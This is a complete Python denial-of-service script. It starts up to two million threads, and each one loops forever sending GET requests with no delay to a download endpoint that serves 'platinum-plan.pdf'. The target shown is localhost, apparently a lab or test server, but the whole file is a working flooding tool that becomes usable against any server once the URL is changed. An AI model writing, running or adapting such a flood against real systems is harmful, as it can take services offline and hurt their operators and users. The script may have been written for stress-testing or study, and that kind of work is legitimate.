import threading
import requests
import time

def flood():
    url = 'http://localhost:5000/download?file=docs/platinum-plan.pdf'
    session = requests.Session()
    
    while True:
        try:
            # Use stream=False to read response immediately and close connection
            response = session.get(url, timeout=5, stream=False)
            print(f"Request sent - Status: {response.status_code}")
            # No sleep between requests for maximum flood
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(0.1)  # Small delay only on error


num_threads = 2000000 

print(f"Starting {num_threads} threads to flood the server...")
for i in range(num_threads):
    t = threading.Thread(target=flood, daemon=True)
    t.start()
    if i % 10 == 0:  # Print progress every 10 threads
        print(f"Started {i+1}/{num_threads} threads...")

print("Flooding in progress. Press Ctrl+C to stop.")
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\nStopping the flood...")
    # No need to join daemon threads, they'll be killed when main exits